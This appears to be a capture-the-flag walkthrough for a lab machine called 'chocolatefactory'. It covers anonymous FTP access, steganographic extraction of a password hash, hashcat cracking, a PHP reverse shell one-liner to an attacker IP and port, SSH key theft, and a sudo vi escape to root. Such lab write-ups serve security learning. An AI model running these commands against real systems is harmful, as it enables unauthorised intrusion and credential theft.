# chocolatefactory

<pre>
                            Reconnaissance 
</pre>

## Port Scanning 

> nmap 10.10.229.79

```
PORT STATE SERVICE
 21/tcp open ftp
 22/tcp open ssh
 80/tcp open http
 100/tcp open newacct
 106/tcp open pop3pw
 109/tcp open pop2
 110/tcp open pop3
 111/tcp open rpcbind
 113/tcp open ident 
 119/tcp open nntp
 125/tcp open locus-map

```


## ANONYMOUS FTP ALLOWED


<pre>
> ftp 10.10.229.79 Connected to 10.10.229.79. 220 (vsFTPd 3.0.3)
 Name (10.10.229.79:greedydev): anonymous
  331 Please specify the password. 
  Password: 230 Login successful. 
  Remote system type is UNIX. 
  Using binary mode to transfer files.
ftp> ls 229 Entering Extended Passive Mode (|||36646|) 150 Here comes the directory listing.
 -rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum\_room.jpg 226 Directory send OK.
ftp> get gum\_room.jpg local: gum\_room.jpg remote: gum\_room.jpg 229 Entering Extended Passive Mode (|||43917|) 150 Opening BINARY mode data connection for gum\_room.jpg (208838 bytes). 100% |\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*| 203 KiB 89.24 KiB/s 00:00 ETA 226 Transfer complete. 208838 bytes received in 00:02 (83.03 KiB/s) 
ftp> \[1] + 94453 suspended ftp 10.10.229.79

</pre>


## Extrtacting Data from the image

> steghide extract -sf gum\_room.jpg Enter passphrase: 
- wrote extracted data to "b64.txt".

> cat b64.txt | base64 --d

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```


Here we get some useful information

1. User : Charlie
2. Password Hash : $6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/

The hashing used is SHA-512

Using hashcat :: hashcat -a 0 hash.txt /usr/share/wordlists/rockyou.txt $6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:cn7824

##### Password : cn7824

Not working on SSH :But there was a login page on the website

#### Credentials for the website

There is a input box where we can execute command

**Getting a revese shell**

``` php -r '$sock=fsockopen("10.17.5.163",4444);exec("/bin/sh -i <&3 >&3 2>&3");' ```


Finding from the nmap scan 
<pre>
113/tcp open ident? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LDAPSearchReq, LPDString, NULL, RTSPRequest, SMBProgNeg> |\_ http://localhost/key\_rev\_key <- You will find the key here!!!
</pre>
http://localhost/key\_rev\_key <- You will find the key here!!!

File Found :: -rw-r--r-- 1 charlie charley 8496 Sep 30 2020 key\_rev\_key

using strings command :: strings key\_rev\_key

This is the keyb'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='

chaging directory to /home/charlie

www-data@chocolate-factory:/home/charlie$ ls -la ls -la total 40 drwxr-xr-x 5 charlie charley 4096 Oct 7 2020 . drwxr-xr-x 3 root root 4096 Oct 1 2020 .. -rw-r--r-- 1 charlie charley 3771 Apr 4 2018 .bashrc drwx------ 2 charlie charley 4096 Sep 1 2020 .cache drwx------ 3 charlie charley 4096 Sep 1 2020 .gnupg drwxrwxr-x 3 charlie charley 4096 Sep 29 2020 .local -rw-r--r-- 1 charlie charley 807 Apr 4 2018 .profile -rw-r--r-- 1 charlie charley 1675 Oct 6 2020 teleport -rw-r--r-- 1 charlie charley 407 Oct 6 2020 teleport.pub -rw-r----- 1 charlie charley 39 Oct 6 2020 user.txt

we got our first flag :: user.txt but we dont have any permission

we found ssh key for user: charlie

Saved the key in a file : id\_rsa

sudo ssh -i id\_rsa charlie@10.10.229.79

Logged in as Charlie

## Priv Escalation

On running sudo -l command we get this output

charlie@chocolate-factory:/opt$ sudo -l Matching Defaults entries for charlie on chocolate-factory: env\_reset, mail\_badpass, secure\_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User charlie may run the following commands on chocolate-factory: (ALL : !root) NOPASSWD: /usr/bin/vi charlie@chocolate-factory:/opt$

this entry allows the user to run the vi editor (located at /usr/bin/vi) as any user without password

For priv escaltion : Source GTFO Bin

```
sudo vi -c ':!/bin/sh' /dev/null
```

charlie@chocolate-factory:/opt$ sudo vi -c ':!/bin/sh' /dev/null

##### \# whoami
root

``we got the root access``

Naviaget to /root There is a root.py lets run this file It is asking for a key Remember we got a key earlier lets try that key

File found :: python root.py

Enter the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='

flag{cec59161d338fef787fcb4e296b42124}

We got our root flag
